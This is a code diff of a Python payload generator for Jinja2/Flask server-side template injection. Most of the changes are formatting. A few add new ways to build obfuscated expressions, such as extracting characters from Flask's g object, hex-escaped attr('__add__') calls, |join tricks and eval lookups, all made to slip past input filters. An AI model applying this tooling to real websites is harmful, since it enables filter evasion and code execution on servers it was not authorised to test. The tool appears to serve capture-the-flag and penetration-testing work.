@@ -267,11 +267,12 @@ def tree_precedence(tree):
     return answer if answer != float("inf") else None
 
 
-def str_escape(value: str, quote = "'"):
+def str_escape(value: str, quote="'"):
     """
     转义字符串中的引号和反斜杠
     """
     return value.replace("\\", "\\\\").replace(quote, "\\" + quote)
+
 
 class PayloadGenerator:
     """生成一个表达式，如('a'+'b')
@@ -571,7 +572,15 @@ class PayloadGenerator:
                 self.cache[gen_req] = ret
             self.used_count[gen.__name__] += 1
             return ret
-        if gen_type not in (CHAINED_ATTRIBUTE_ITEM, ATTRIBUTE, ITEM, PLUS, MULTIPLY, STRING_CONCAT):
+        if gen_type not in (
+            CHAINED_ATTRIBUTE_ITEM,
+            ATTRIBUTE,
+            ITEM,
+            PLUS,
+            MULTIPLY,
+            STRING_CONCAT,
+            MOD,
+        ):
             logger.info(
                 "{failed} generating {gen_type}({args_repl}), it might not be an issue.".format(
                     failed=colored("red", "failed"),
@@ -661,6 +670,7 @@ def gen_string_concat_tilde(context: dict, a, b) -> List[LiteralTarget]:
 
 # ---
 
+
 @expression_gen
 def gen_string_concatmany_onebyone(context: dict, parts) -> List[LiteralTarget]:
     answer = parts[0]
@@ -668,14 +678,20 @@ def gen_string_concatmany_onebyone(context: dict, parts) -> List[LiteralTarget]:
         answer = (STRING_CONCAT, answer, part)
     return [answer]
 
+
 @expression_gen
 def gen_string_concatmany_join(context: dict, parts) -> List[LiteralTarget]:
-    target_list = [
-        (LITERAL, "("),
-    ] + join_target(sep = (LITERAL, ","), targets = parts) + [
-        (LITERAL, ")|join"),
-    ]
+    target_list = (
+        [
+            (LITERAL, "("),
+        ]
+        + join_target(sep=(LITERAL, ","), targets=parts)
+        + [
+            (LITERAL, ")|join"),
+        ]
+    )
     return [(EXPRESSION, precedence["filter"], target_list)]
+
 
 # ---
 
@@ -705,10 +721,11 @@ def gen_plus_addfunc(context: dict, a, b):
 
 @expression_gen
 def gen_plus_addfuncbyfilter(context: dict, a, b):
-    get_add_func = (ONEOF,
+    get_add_func = (
+        ONEOF,
         [(LITERAL, "|attr('__add__')(")],
-        [(LITERAL, "|attr(\"__add__\")(")],
-        [(LITERAL, "|attr(\"\\x5f\\x5fadd\\x5f\\x5f\")(")],
+        [(LITERAL, '|attr("__add__")(')],
+        [(LITERAL, '|attr("\\x5f\\x5fadd\\x5f\\x5f")(')],
     )
     return [
         (
@@ -722,6 +739,7 @@ def gen_plus_addfuncbyfilter(context: dict, a, b):
             ],
         )
     ]
+
 
 # ---
 
@@ -1130,21 +1148,26 @@ def gen_positive_integer_truesum2(context: dict, value: int):
 @expression_gen
 def gen_positive_integer_bool(context: dict, value: int):
     if value not in (0, 1):
-        return [(UNSATISFIED, )]
+        return [(UNSATISFIED,)]
 
     target_list = [(LITERAL, str(value == 1))]
     return [(EXPRESSION, precedence["literal"], target_list)]
 
+
 @expression_gen
 def gen_positive_integer_indexoftrue(context: dict, value: int):
     if value <= 1:
-        return [(UNSATISFIED, )]
-    falses = [
-        (LITERAL, "False,")
-        for _ in range(value - 1)
-    ]
-    target_list = [(LITERAL, "("), ] + falses + [(LITERAL, ",True).index(True)")]
+        return [(UNSATISFIED,)]
+    falses = [(LITERAL, "False,") for _ in range(value - 1)]
+    target_list = (
+        [
+            (LITERAL, "("),
+        ]
+        + falses
+        + [(LITERAL, ",True).index(True)")]
+    )
     return [(EXPRESSION, precedence["function_call"], target_list)]
+
 
 # ---
 
@@ -1616,6 +1639,17 @@ def gen_string_percent_lower_c_literal2(context):
 
 
 @expression_gen
+def gen_string_percent_lower_c_context(context):
+    if "%c" not in context.values():
+        return [(UNSATISFIED, )]
+    vs = [k for k, v in context.items() if v == "%c"]
+    alternatives = [
+        [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]
+        for v in vs
+    ]
+    return [(EXPRESSION, precedence["literal"], [(ONEOF, *alternatives)])]
+
+@expression_gen
 def gen_string_percent_lower_c_concat(context):
     return [(STRING_CONCAT, (STRING_PERCENT,), (STRING_LOWERC,))]
 
@@ -1687,11 +1721,13 @@ def gen_string_percent_lower_c_cycler(context):
 
 # ---
 
+
 @expression_gen
 def gen_string_many_percent_lower_c_asis(context, count: int):
     if count != 1:
-        return [(UNSATISFIED, )]
-    return [(STRING_PERCENT_LOWER_C, )]
+        return [(UNSATISFIED,)]
+    return [(STRING_PERCENT_LOWER_C,)]
+
 
 @expression_gen
 def gen_string_many_percent_lower_c_multiply(context, count: int):
@@ -1745,6 +1781,7 @@ def gen_string_many_percent_lower_c_nulljoin(context, count: int):
     )
     return [(EXPRESSION, precedence["filter"], target_list)]
 
+
 @expression_gen
 def gen_string_many_percent_lower_c_nulljoin2(context, count: int):
     # ((x,x,x)|join('%c'))
@@ -1756,6 +1793,7 @@ def gen_string_many_percent_lower_c_nulljoin2(context, count: int):
         + [(LITERAL, ")|join("), (STRING_PERCENT_LOWER_C,), (LITERAL, ",)")]
     )
     return [(EXPRESSION, precedence["filter"], target_list)]
+
 
 @expression_gen
 def gen_string_many_percent_lower_c_concat(context, count: int):
@@ -2072,6 +2110,33 @@ def gen_char_select(context, c):
 
 
 @expression_gen
+def gen_char_flaskg(context, c):
+    d = {
+        1: "&",
+        2: "l",
+        3: "t",
+        4: ";",
+        5: "f",
+        6: "l",
+        7: "a",
+        8: "s",
+        9: "k",
+        10: ".",
+        11: "g",
+        12: " ",
+        13: "o",
+        14: "f",
+    }
+    matches = []
+    pattern = "g|e|batch(INDEX)|first|last"
+    for index, value in d.items():
+        if value == c:
+            matches.append([(LITERAL, pattern.replace("INDEX", str(index)))])
+    target_list = [(ONEOF, *matches)]
+    return [(EXPRESSION, precedence["filter"], target_list)]
+
+
+@expression_gen
 def gen_char_dict(context, c):
     if not re.match("[A-Za-z]", c):
         return [(UNSATISFIED,)]
@@ -2127,9 +2192,12 @@ def gen_string_2(context: dict, value: str):
 def gen_string_context(context: dict, value: str):
     if value not in context.values():
         return [(UNSATISFIED,)]
-    v = [k for k, v in context.items() if v == value][0]
-    target_list = [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]
-    return [(EXPRESSION, precedence["literal"], target_list)]
+    vs = [k for k, v in context.items() if v == value]
+    alternatives = [
+        [(LITERAL, v)] + [(WITH_CONTEXT_VAR, v)]
+        for v in vs
+    ]
+    return [(EXPRESSION, precedence["literal"], [(ONEOF, *alternatives)])]
 
 
 @expression_gen
@@ -2193,7 +2261,6 @@ def gen_string_removedunder2(context: dict, value: str):
         (STRING_UNDERLINE,),
     ]
     return [(STRING_CONCATMANY, strings)]
-
 
 
 @expression_gen
@@ -2288,9 +2355,7 @@ def gen_string_concat2(context: dict, value: str):
 
 @expression_gen
 def gen_string_concat3(context: dict, value: str):
-    target_list = [
-        (LITERAL, "".join('"{}"'.format(str_escape(c, '"')) for c in value))
-    ]
+    target_list = [(LITERAL, "".join('"{}"'.format(str_escape(c, '"')) for c in value))]
     return [(EXPRESSION, precedence["literal"], target_list)]
 
 
@@ -2499,13 +2564,13 @@ def gen_string_chars2(context: dict, value: str):
 @expression_gen
 def gen_string_stringaschars(context: dict, value: str):
     if len(value) <= 1 or re.match("^[a-zA-Z][a-zA-Z0-9]$", value):
-        return [(UNSATISFIED, )]
+        return [(UNSATISFIED,)]
     targets = []
     while value:
         regexp = re.match("^[a-zA-Z][a-zA-Z0-9]+", value)
         if regexp:
             targets.append((STRING, regexp.group(0)))
-            value = value[len(regexp.group(0)):]
+            value = value[len(regexp.group(0)) :]
         else:
             targets.append((STRING, value[0]))
             value = value[1:]
@@ -2513,6 +2578,7 @@ def gen_string_stringaschars(context: dict, value: str):
     for other_target in targets[1:]:
         final_target = (STRING_CONCAT, final_target, other_target)
     return [final_target]
+
 
 # ---
 
@@ -2814,7 +2880,7 @@ def gen_eval_func_unexist(context):
         [(LITERAL, "x")],
         [(LITERAL, "unexistfuckyou")],
     ] + [
-        [(LITERAL, "".join(random.choices(string.ascii_lowercase, k = 6)))]
+        [(LITERAL, "".join(random.choices(string.ascii_lowercase, k=6)))]
         for _ in range(20)
     ]
     return [
@@ -2827,6 +2893,7 @@ def gen_eval_func_unexist(context):
             (ITEM, "eval"),
         )
     ]
+
 
 @expression_gen
 def gen_eval_func_joiner(context):
@@ -2963,6 +3030,7 @@ def gen_eval_normal2(context, eval_param):
         (LITERAL, ",)"),
     ]
     return [(EXPRESSION, precedence["function_call"], target_list)]
+
 
 # ---
 
